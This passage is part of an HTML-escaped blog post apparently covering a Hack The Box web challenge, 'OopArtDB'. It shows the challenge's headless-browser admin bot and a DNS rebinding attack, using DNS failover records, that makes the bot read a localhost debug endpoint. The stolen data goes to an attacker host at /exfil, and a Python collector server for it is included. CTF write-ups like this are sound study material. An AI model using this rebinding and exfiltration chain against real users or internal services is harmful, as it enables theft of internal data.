+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// challenge/bot.js
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">visit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">async&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">browser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">puppeteer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">launch&lt;/span>&lt;span class="p">({&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headless&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pipe&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">args&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--no-sandbox&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--disable-setuid-sandbox&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--js-flags=--noexpose_wasm,--jitless&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">dumpio&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">context&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createIncognitoBrowserContext&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">page&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">newPage&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">goto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost/login&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">waitUntil&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;networkidle2&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">evaluate&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">pass&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;input[name=user]&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;input[name=pass]&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">pass&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;button[type=submit]&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">click&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span> &lt;span class="s2">&amp;#34;The Overseer&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">waitForNavigation&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">goto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">waitUntil&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;networkidle2&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">waitForTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">7000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">close&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">browser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">finally&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">browser&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">close&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So the problem is that the client is making a request to &lt;code>http://localhost/debug&lt;/code> from &lt;code>http://attacker.com&lt;/code>, which gets blocked.
+But what if during the delay between the bot visiting the attacker site, and then timing out, we rebind the address for &lt;code>http://attacker.com&lt;/code> to instead point to &lt;code>127.0.0.1&lt;/code>?&lt;/p>
+&lt;ol>
+&lt;li>So the bot visits &lt;code>http://attacker.com&lt;/code>, which will resolve to our real address (lets say it is &lt;code>1.3.3.7&lt;/code>).&lt;/li>
+&lt;li>We rebind &lt;code>http://attacker.com&lt;/code> to &lt;code>127.0.0.1&lt;/code>, WHILE the bot still has the page loaded in their browser.&lt;/li>
+&lt;li>Then our script will run, and will send a request to &lt;code>http://attacker.com/debug&lt;/code>, which is now actually &lt;code>http://127.0.0.1/debug&lt;/code>, successfully grabbing the environment data that we need.&lt;/li>
+&lt;li>Then we make a post request to &lt;code>http://1.3.3.7/exfil&lt;/code> containing the response to &lt;code>http://attacker.com/debug&lt;/code> (actually &lt;code>http://127.0.0.1/debug&lt;/code>), (and we set our CORS policy to allow requests from any domain), which successfully exfils the data to us.&lt;/li>
+&lt;/ol>
+&lt;p>A key element to making this attack work is having a low TTL on the DNS response, so the browser is forced to ask for the address twice.&lt;/p>
+&lt;p>I decided to use this &lt;a class="link" href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener"
+>dns rebind site&lt;/a> to facilitate the attack.
+The first address will be that of my EC2 instance, and the second will be &lt;code>127.0.0.1&lt;/code>.
+Then we just need to run the attack a few times until we get the elements to line up properly.&lt;/p>
+&lt;p>However this attack kept failing.
+I would always receive both requests to my ec2 instance, no matter how many times I tried.
+I tried changing the delays, but never worked.
+At the end of this article I will explore why this was.&lt;/p>
+&lt;h3 id="bypass-2">Bypass 2
+&lt;/h3>&lt;p>In the same hacktricks article, a second subtype of dns rebinding was mentioned.
+Its very similar, but instead of depending on TTL to cause the browser to resolve the address, it will used availability of the server instead.
+We can use a service like AWS Route 53 to register 2 IP addresses for the same domain name, in our case it will be (&lt;code>1.3.3.7&lt;/code> and &lt;code>127.0.0.1&lt;/code>).
+For the first request to collect the CSRF payload, we allow the &lt;code>1.3.3.7&lt;/code> ec2 instance to remain available, but once the page is loaded, we kill the instance.
+That way, when the next request is made to &lt;code>http://attacker.com/debug&lt;/code> and it tries to make the request to our ec2 instance at &lt;code>1.3.3.7&lt;/code>, the request will fail, and the victim&amp;rsquo;s browser will fallback to &lt;code>127.0.0.1&lt;/code>, allowing the attack to work.
+I will also set up a second ec2 instance to collect the post request, because I don&amp;rsquo;t want to depend on the first ec2 instance booting up in time to catch the exfiltration POST request.
+In AWS this is called failover-routing.
+However, this requires registering a domain with AWS, which costs about 13$ depending on the name you chose, or 79$ to transfer in an existing domain.
+I tried to find a free alternative, but wasn&amp;rsquo;t successful.
+Seems like at the minimum you need a domain, which I was able to get on Gandi for about 3$.
+Then I added in 2 DNS A records with the address of my ec2 instance and &lt;code>0.0.0.0&lt;/code> as per the suggestion on HackTricks.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/8.png"
+width="993"
+height="114"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/8_huaf59b0db051cbccc042266550b267afd_5360_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/8_huaf59b0db051cbccc042266550b267afd_5360_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="2 DNS A records"
+class="gallery-image"
+data-flex-grow="871"
+data-flex-basis="2090px"
+>&lt;/p>
+&lt;p>The min TTL is 300, but fortunately we won&amp;rsquo;t depend on TTL for this attack, since we just depend on connectivity causing the browser to fallback to the alternative address (&lt;code>0.0.0.0&lt;/code>).&lt;/p>
+&lt;p>AND THIS WORKED !!&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/9.png"
+width="683"
+height="117"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/9_hu7d4752c376da2419cce15044c6d98500_7470_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/9_hu7d4752c376da2419cce15044c6d98500_7470_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Kill the server after the first request"
+class="gallery-image"
+data-flex-grow="583"
+data-flex-basis="1401px"
+> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/10.png"
+width="629"
+height="562"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/10_hu5fc19c9a5454334247fdaa9977a17e1b_15410_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/10_hu5fc19c9a5454334247fdaa9977a17e1b_15410_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Request to exfil contains our debug info"
+class="gallery-image"
+data-flex-grow="111"
+data-flex-basis="268px"
+>&lt;/p>
+&lt;p>At this point just little automation for killing the payload server after the first request, and saving the post request for further examination:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">http.server&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">HTTPServer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">test&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">CORSRequestHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">end_headers&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send_header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Access-Control-Allow-Origin&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">end_headers&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">do_GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;/index.html&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">do_GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Exit the program after serving the index.html file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">do_GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">do_POST&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">content_length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;Content-Length&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">post_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rfile&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">content_length&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;/exfil&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;debug.txt&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;wb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">post_data&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[*] Exfil data written to debug.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CORSRequestHandler&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HTTPServer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">80&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/12.png"
+width="820"
+height="650"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/12_hu95d6488530ee901344af53801fd2b1d7_80813_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/12_hu95d6488530ee901344af53801fd2b1d7_80813_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Current attack structure"
+class="gallery-image"
+data-flex-grow="126"
+data-flex-basis="302px"
+>&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/11.png"
+width="683"
+height="184"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/11_hueed3f851ca10f44d92646e6d96dbd821_11973_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/11_hueed3f851ca10f44d92646e6d96dbd821_11973_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Referral token acquired"
+class="gallery-image"
+data-flex-grow="371"
+data-flex-basis="890px"
+>&lt;/p></description></item></channel></rss>
